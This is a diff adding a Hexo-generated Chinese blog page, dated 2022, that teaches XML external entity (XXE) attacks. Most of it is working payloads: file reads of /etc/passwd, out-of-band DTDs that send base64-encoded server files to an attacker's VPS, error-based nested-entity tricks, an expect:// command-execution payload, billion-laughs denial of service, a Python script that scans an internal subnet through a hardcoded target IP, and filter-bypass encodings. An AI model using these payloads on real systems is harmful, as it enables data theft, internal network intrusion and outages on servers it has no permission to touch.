@@ -1,0 +1,605 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
+        <title>Hexo</title>
+        <meta name="author" content="John Doe">
+        <meta name="description" content="">
+        <meta name="keywords" content="">
+        <link rel="icon" href="">
+        <script src="https://cdn.staticfile.org/instant.page/5.1.0/instantpage.min.js" type="module"></script>
+        <script src="https://cdn.staticfile.org/font-awesome/6.1.1/js/all.min.js"></script>
+        
+        <link rel="stylesheet" href="/css/fonts.min.css">
+        <link rel="stylesheet" href="/css/particlex.css">
+        
+        <script src="https://cdn.staticfile.org/vue/3.2.33/vue.global.prod.min.js"></script>
+    <meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div id="loading" style="height:100vh;width:100vw;position:fixed;display:flex;z-index:200;justify-content:space-between;background:#fff;transition:opacity 0.3s ease-out"><div style="position:fixed;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center"><div id="loadcontent" style="width:50vmin;height:50vmin;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px #a3ddfb;text-align:center"><div><h2>LOADING...</h2><p style="word-break:keep-all">加载过慢请开启缓存(浏览器默认开启)</p><div><img alt="loading" src="/loading.gif"></div></div></div></div></div>
+        <div id="layout">
+            <i data-fa-symbol="calendar-solid" class="fa-solid fa-calendar fa-fw"></i>
+            <i data-fa-symbol="bookmark-solid" class="fa-solid fa-bookmark fa-fw"></i>
+            <i data-fa-symbol="tags-solid" class="fa-solid fa-tags fa-fw"></i>
+            <transition name="into">
+                <div v-show="show_page" style="display: -not-none">
+                    <div id="menu_show">
+                         
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hexo</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;about</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;tags</span>
+        </a>
+        
+    </div>
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div class="curtain" @click="menu_show = !menu_show" v-show="menu_show"></div>
+        <div :class="'title'" @click="menu_show = !menu_show">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;Hexo</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="menu_show">
+            
+            <a href="">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">home</div>
+                </div>
+            </a>
+            
+            <a href="about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">about</div>
+                </div>
+            </a>
+            
+            <a href="archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">archives</div>
+                </div>
+            </a>
+            
+            <a href="categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">categories</div>
+                </div>
+            </a>
+            
+            <a href="tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">tags</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+                    </div>
+                    <div id="main">
+                        
+<div class="article">
+    <div>
+        <h1> </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2022/8/24
+        </span>
+        
+        
+    </div>
+    <div class="content" v-pre>
+        <h1 id="二，xxe漏洞"><a href="#二，xxe漏洞" class="headerlink" title="二，xxe漏洞"></a>二，xxe漏洞</h1><p>XML 外部实体注入（也称为 XXE）是一种 Web 安全漏洞，允许攻击者干扰应用程序对 XML 数据的处理。它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。</p>
+<p>在某些情况下，攻击者可以通过利用 XXE 漏洞执行服务器端请求伪造(SSRF) 攻击 来升级 XXE 攻击以破坏底层服务器或其他后端基础设施。</p>
+<h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>XXE(XML External Entity Injection) XML外部实体注入，XML是一种类似于HTML（超文本标记语言）的可扩展标记语言，是用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</p>
+<p><strong>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</strong></p>
+<p><strong>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</strong></p>
+<p><strong>DTD通过在xml文档开头的DOCTYPE声明</strong></p>
+<h3 id="内部DOCTYPE声明"><a href="#内部DOCTYPE声明" class="headerlink" title="内部DOCTYPE声明"></a>内部DOCTYPE声明</h3><p>格式：&lt;!DOCTYPE 根元素 [元素声明]&gt;</p>
+<p>带有 DTD 的 XML 文档实例：</p>
+<pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE note [							##定义此文档是note类型文档
+&lt;!ELEMENT note (to,from,heading,body)&gt;		##定义note有四个元素：to，from，heading，body
+&lt;!ELEMENT to      (#PCDATA)&gt;				##定义元素to是&quot;#PCDATA&quot;类型
+&lt;!ELEMENT from    (#PCDATA)&gt;
+&lt;!ELEMENT heading (#PCDATA)&gt;
+&lt;!ELEMENT body    (#PCDATA)&gt;
+]&gt;
+&lt;note&gt;
+&lt;to&gt;George&lt;/to&gt;
+&lt;from&gt;John&lt;/from&gt;
+&lt;heading&gt;Reminder&lt;/heading&gt;
+&lt;body&gt;Don&#39;t forget the meeting!&lt;/body&gt;
+&lt;/note&gt;
+</code></pre>
+<h3 id="外部DOCTYPE声明"><a href="#外部DOCTYPE声明" class="headerlink" title="外部DOCTYPE声明"></a>外部DOCTYPE声明</h3><p>格式：&lt;!DOCTYPE 根元素 SYSTEM “文件名”&gt;</p>
+<p>带有外部 DTD 的 XML 文档实例：</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;
+&lt;note&gt;
+&lt;to&gt;George&lt;/to&gt;
+&lt;from&gt;John&lt;/from&gt;
+&lt;heading&gt;Reminder&lt;/heading&gt;
+&lt;body&gt;Don&#39;t forget the meeting!&lt;/body&gt;
+&lt;/note&gt;
+</code></pre>
+<p>被包含的note.dtd文件：</p>
+<pre><code class="dtd">&lt;!ELEMENT note (to,from,heading,body)&gt;
+&lt;!ELEMENT to (#PCDATA)&gt;
+&lt;!ELEMENT from (#PCDATA)&gt;
+&lt;!ELEMENT heading (#PCDATA)&gt;
+&lt;!ELEMENT body (#PCDATA)&gt;
+</code></pre>
+<h3 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h3><p>实体：</p>
+<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>
+<p>实体引用是对实体的引用。</p>
+<p>实体可在内部或外部进行声明。</p>
+<h4 id="通用实体"><a href="#通用实体" class="headerlink" title="通用实体"></a>通用实体</h4><h5 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h5><p>格式：&lt;!ENTITY 实体名称 “实体的值”&gt;</p>
+<p>eg：</p>
+<p>DTD</p>
+<pre><code class="dtd">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;
+&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;
+</code></pre>
+<p>xml</p>
+<pre><code class="xml">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;
+</code></pre>
+<p>注释: 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>
+<h5 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h5><p>格式：&lt;!ENTITY 实体名称 SYSTEM “URI&#x2F;URL”&gt;</p>
+<p>eg:</p>
+<p>DTD</p>
+<pre><code class="dtd">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;
+&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;
+</code></pre>
+<p>xml</p>
+<pre><code class="xml">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;
+</code></pre>
+<h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p>
+<p>eg：</p>
+<pre><code class="dtd">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; 
+&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; 
+%an-element; %remote-dtd;
+</code></pre>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p><strong>抓包查找漏洞点</strong></p>
+<p>Content-Type是xml，或者post数据为json，xml</p>
+<p><strong>源码查找xml解释器</strong></p>
+<p>svg图片上传点</p>
+<p>post-Office 2007 文件（实际上只是 XML 文档的 zip 文件）上传点</p>
+<h2 id="漏洞判断"><a href="#漏洞判断" class="headerlink" title="漏洞判断"></a>漏洞判断</h2><p>抓包修改可疑包，发送xml实体，如果返回我们想要的数据，基本可以确定存在xml漏洞</p>
+<p>检测xml是否会被解析：</p>
+<pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY words &quot;Hello XXE !&quot;&gt;]&gt;&lt;root&gt;&amp;words;&lt;/root&gt;
+</code></pre>
+<p>检测是否支持DTD引用外部实体：</p>
+<pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8”?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY % name SYSTEM &quot;http://localhost/tp5/test.xml&quot;&gt;%name;]&gt;
+</code></pre>
+<p>查看服务器日志可以知道是否被利用</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="有回显文件读取"><a href="#有回显文件读取" class="headerlink" title="有回显文件读取"></a>有回显文件读取</h3><pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE creds [  
+&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; 
+&lt;creds&gt;&amp;goodies;&lt;/creds&gt;
+</code></pre>
+<pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE test [
+&lt;!ENTITY % file SYSTEM &quot;http://vps-ip/hack.dtd&quot;&gt;
+%file;
+]&gt;
+&lt;test&gt;&amp;hack;&lt;/test&gt;
+</code></pre>
+<pre><code class="xml-dtd">&lt;!-- hack.dtd --&gt;
+&lt;!ENTITY hack SYSTEM &#39;file:///etc/passwd&#39;&gt;
+</code></pre>
+<p>使用协议进行读取</p>
+<p>ps：</p>
+<p>不同的程序xml支持不同的协议</p>
+<table>
+<thead>
+<tr>
+<th>LIBXML2</th>
+<th>PHP</th>
+<th>JAVA</th>
+<th>.NET</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file</td>
+<td>file</td>
+<td>http</td>
+<td>file</td>
+</tr>
+<tr>
+<td>http</td>
+<td>http</td>
+<td>https</td>
+<td>http</td>
+</tr>
+<tr>
+<td>ftp</td>
+<td>ftp</td>
+<td>ftp</td>
+<td>https</td>
+</tr>
+<tr>
+<td></td>
+<td>php</td>
+<td>file</td>
+<td>ftp</td>
+</tr>
+<tr>
+<td></td>
+<td>compress.zlib</td>
+<td>jar</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>compress.bzip2</td>
+<td>netdoc</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>data</td>
+<td>mailto</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>glob</td>
+<td>gopher*</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>phar</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>如果程序安装扩展的话会支持更多协议。</p>
+<p><img src="/%E4%BA%8C%EF%BC%8Cxxe%E6%BC%8F%E6%B4%9E.assets/image-20220325084151821.png" alt="image-20220325084151821"></p>
+<p>但是，如果我们读取的文件内容有太多符号（如：&amp;,&lt;,&gt;,”,’）导致被解析引擎解析报错，我们无法得到想要的文件内容。这时就要靠CDATA</p>
+<h4 id="XInclude读取文件"><a href="#XInclude读取文件" class="headerlink" title="XInclude读取文件"></a>XInclude读取文件</h4><p>一些应用程序接收客户端提交的数据，在服务器端将其嵌入到 XML 文档中，然后解析该文档。当客户端提交的数据被放入后端 SOAP 请求中时，就会出现这种情况的一个示例，该请求随后由后端 SOAP 服务处理。</p>
+<p>在这种情况下，您无法执行经典的 XXE 攻击，因为您无法控制整个 XML 文档，因此无法定义或修改<code>DOCTYPE</code>元素。但是，您也许可以<code>XInclude</code>改用。<code>XInclude</code>是 XML 规范的一部分，它允许从子文档构建 XML 文档。您可以<code>XInclude</code>在 XML 文档中的任何数据值中进行攻击，因此可以在您仅控制放置在服务器端 XML 文档中的单个数据项的情况下执行攻击</p>
+<pre><code class="xml-dtd">&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;
+&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;
+</code></pre>
+<h4 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h4><p>格式：&lt; ! [ CDATA ［忽略检查的文本］］&gt;</p>
+<p>在CDATA中将文本的内容写入，那么这段文本内容会被忽略检查，无论里面是否包含XML敏感内容，全部被当作普通的文本去看待。</p>
+<p>需要注意的是，CDATA的文本内容中不能出现字符串“]]&gt;”，也不能嵌套。</p>
+<p>我们希望读取的内容写在CDATA里，但由于CDATA不允许嵌套，所以我们只能通过多个实体拼接，拼接后再在xml中调用。（注意，不能在xml中直接拼接，应当是拼接后在xml中调用！！，所以不应当用通用实体而是用参数实体）</p>
+<p>eg：</p>
+<pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE roottag [
+&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   
+&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  
+&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  
+&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; 
+%dtd; ]&gt; 
+
+&lt;roottag&gt;&amp;all;&lt;/roottag&gt;
+</code></pre>
+<p>evil.dtd</p>
+<pre><code class="dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
+&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;
+</code></pre>
+<h3 id="无回显文件读取"><a href="#无回显文件读取" class="headerlink" title="无回显文件读取"></a>无回显文件读取</h3><h4 id="OOB外带"><a href="#OOB外带" class="headerlink" title="OOB外带"></a>OOB外带</h4><p>如果我们插入的xml实体被执行，但不提供回显该怎么办？</p>
+<p>test.dtd</p>
+<pre><code class="xml-dtd">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://ip:9999?p=%file;&#39;&gt;
+</code></pre>
+<p>payload</p>
+<pre><code class="xml-dtd">&lt;!DOCTYPE convert [ 
+&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;
+%remote;%int;%send;
+]&gt;
+</code></pre>
+<p>整个payload的思路就是执行%remote实体让服务器去访问我们的vps服务器上的test.dtd，然后执行%int实体，%int实体会调用%file实体读取服务器本地文件，base64编码后将结果添入%int实体中的%send作为发包参数（因为实体的值中不能有 %, 所以将其转成html实体编码 &amp;#37;）,最后调用%send实体将读取到的数据发送到我们的vps的9999端口。</p>
+<p>这种方法很像ssrf，不是吗？</p>
+<h4 id="基于报错"><a href="#基于报错" class="headerlink" title="基于报错"></a>基于报错</h4><p>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的 url并将泄露文件内容放在url中，通过这样的方式返回数据,所以和OOB的构造方式几乎只有url出不同， 其他地方相同。</p>
+<h5 id="通过引入服务器文件"><a href="#通过引入服务器文件" class="headerlink" title="通过引入服务器文件"></a>通过引入服务器文件</h5><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE message [
+&lt;!ENTITY % remote SYSTEM &quot;http://blog.szfszf.top/xml.dtd&quot;&gt;
+&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-
+encode/resource=file:///flag&quot;&gt;
+%remote;
+%send;
+]&gt;
+&lt;message&gt;1234&lt;/message&gt;
+</code></pre>
+<pre><code>&lt;!-- xml.dtd --&gt;
+&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;file:///hhhhhhh/%file;&#39;&gt;&quot;&gt;
+%start;
+</code></pre>
+<h5 id="通过引入本地文件"><a href="#通过引入本地文件" class="headerlink" title="通过引入本地文件"></a>通过引入本地文件</h5><p>如果目标主机的防火墙十分严格，不允许我们请求外网服务器dtd呢？由于XML的广泛使用，其实在各个 系统中已经存在了部分DTD文件。按照上面的理论，我们只要是从外部引入DTD文件，并在其中定义一 些实体内容就行。</p>
+<p>ubuntu系统自带的<code>/usr/share/yelp/dtd/docbookx.dtd</code></p>
+<p>我们可以在内部重写一个该dtd文件中含有的参数实体，而此时调用是在外部，这样仍然可以实现</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE message [
+&lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;
+&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-
+encode/resource=file:///flag&quot;&gt;
+&lt;!ENTITY % ISOamso &#39;
+&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM
+&amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
+&amp;#x25;eval;
+&amp;#x25;send;
+&#39;&gt;
+%remote;
+]&gt;
+&lt;message&gt;1234&lt;/message&gt;
+</code></pre>
+<p>其中，这里已经是三层参数实体嵌套了，第二层嵌套时我们只需要给定义参数实体的<code>%</code>编码，第三层就需要在第二层的基础上将所有<code>%</code>、<code>&amp;</code>、<code>&#39;</code>、<code>&quot;</code> html编码。</p>
+<p>第一个调用的参数实体是%remote，在&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd文件中调用了%ISOamso;， 在ISOamso定义的实体中相继调用了eval、和send</p>
+<h5 id="嵌套参数实体"><a href="#嵌套参数实体" class="headerlink" title="嵌套参数实体"></a>嵌套参数实体</h5><p>虽然W3C协议是不允许在内部的实体声明中引用参数实体，但是很多XML解析器并没有很好的执行这个 检查。几乎所有XML解析器能够发现如下这种两层嵌套式</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE message [
+&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://myip/?%file;&#39;&gt;&quot;&gt;
+%start;
+%send;
+]&gt;
+&lt;message&gt;1234&lt;/message&gt;
+</code></pre>
+<h5 id="基于报错的三层嵌套参数实体XXE"><a href="#基于报错的三层嵌套参数实体XXE" class="headerlink" title="基于报错的三层嵌套参数实体XXE"></a>基于报错的三层嵌套参数实体XXE</h5><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE message [
+&lt;!ELEMENT message ANY&gt;
+&lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;
+&lt;!ENTITY % para &#39;
+&lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM
+&amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;
+&amp;#x25;para2;
+&#39;&gt;
+%para;
+]&gt;
+&lt;message&gt;1234&lt;/message&gt;
+</code></pre>
+<h3 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h3><p>的确，xxe就是一种特殊的ssrf攻击，ssrf可以做到的，xxe基本也可以做到</p>
+<h4 id="http内网主机探测"><a href="#http内网主机探测" class="headerlink" title="http内网主机探测"></a>http内网主机探测</h4><p>尝试读取 &#x2F;etc&#x2F;network&#x2F;interfaces 或者 &#x2F;proc&#x2F;net&#x2F;arp 或者 &#x2F;etc&#x2F;host 文件可以确定大致扫描方向</p>
+<p>一个批量探测内网的脚本示例：</p>
+<pre><code class="python">import requests
+import base64
+
+#Origtional XML that the server accepts
+#&lt;xml&gt;
+#    &lt;stuff&gt;user&lt;/stuff&gt;
+#&lt;/xml&gt;
+
+
+def build_xml(string):
+    xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;
+    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;
+    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;
+    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;
+    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;
+    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;
+    send_xml(xml)
+
+def send_xml(xml):
+    headers = &#123;&#39;Content-Type&#39;: &#39;application/xml&#39;&#125;
+    x = requests.post(&#39;http://34.200.157.128/CUSTOM/NEW_XEE.php&#39;, data=xml, headers=headers, timeout=5).text
+    coded_string = x.split(&#39; &#39;)[-2] # a little split to get only the base64 encoded value
+    print coded_string
+#   print base64.b64decode(coded_string)
+for i in range(1, 255):
+    try:
+        i = str(i)
+        ip = &#39;10.0.0.&#39; + i
+        string = &#39;php://filter/convert.base64-encode/resource=http://&#39; + ip + &#39;/&#39;
+        print string
+        build_xml(string)
+    except:
+continue
+</code></pre>
+<h4 id="http内网端口扫描"><a href="#http内网端口扫描" class="headerlink" title="http内网端口扫描"></a>http内网端口扫描</h4><p>只需固定ip然后对端口进行循环探测即可</p>
+<p>或者用bp配合扫描</p>
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当&#x2F;开发内部应用 导致的。如果我们足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程 序上，那么我们就可以执行如下的命令： 以下代码将尝试与端口8080通信，根据响应时间&#x2F;长度，攻击者将可以判断该端口是否已被开启</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;
+&lt;catalog&gt;
+&lt;core id=&quot;test101&quot;&gt;
+&lt;author&gt;John, Doe&lt;/author&gt;
+&lt;title&gt;I love XML&lt;/title&gt;
+&lt;category&gt;Computers&lt;/category&gt;
+&lt;price&gt;9.99&lt;/price&gt;
+&lt;date&gt;2021-10-01&lt;/date&gt;
+&lt;description&gt;&amp;xxe;&lt;/description&gt;
+&lt;/core&gt;
+&lt;/catalog&gt;
+</code></pre>
+<p>响应：</p>
+<pre><code>&#123;&quot;error&quot;: &quot;no results for description uid=0(root) gid=0(root) groups=0(root)...
+</code></pre>
+<h3 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h3><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE lolz [
+&lt;!ENTITY lol &quot;lol&quot;&gt;
+&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
+&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
+&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
+&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
+&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
+&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
+&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
+&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;
+]&gt;
+&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
+</code></pre>
+<p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。 如果目标是UNIX系统，</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot;&gt;
+]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre>
+<p>如果 XML 解析器尝试使用 &#x2F;dev&#x2F;random 文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p>
+<h3 id="OOXML"><a href="#OOXML" class="headerlink" title="OOXML"></a>OOXML</h3><p>首先用excel创建一个空白的xlsx，然后解压</p>
+<pre><code>mkdir XXE &amp;&amp; cd XXE
+unzip ../XXE.xlsx
+</code></pre>
+<p>将 [Content_Types].xml 改成恶意xml，再压缩回去</p>
+<pre><code>zip -r ../poc.xlsx *
+</code></pre>
+<h2 id="漏洞绕过"><a href="#漏洞绕过" class="headerlink" title="漏洞绕过"></a>漏洞绕过</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>利用正则匹配不严格，大小写绕过</p>
+<h3 id="ENTITY、SYSTEM、file等关键词被过滤"><a href="#ENTITY、SYSTEM、file等关键词被过滤" class="headerlink" title="ENTITY、SYSTEM、file等关键词被过滤"></a>ENTITY、SYSTEM、file等关键词被过滤</h3><p>使用编码方式绕过：UTF-16BE</p>
+<pre><code>cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml
+</code></pre>
+<h3 id="html实体编码绕过"><a href="#html实体编码绕过" class="headerlink" title="html实体编码绕过"></a>html实体编码绕过</h3><p>如果过滤了http等协议，可以利用实体编码绕过：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE test [
+&lt;!ENTITY % a &quot;&lt;!ENTITY b SYSTEM &#39;file:///flag&#39; &gt;&quot; &gt;
+%a;
+]&gt;
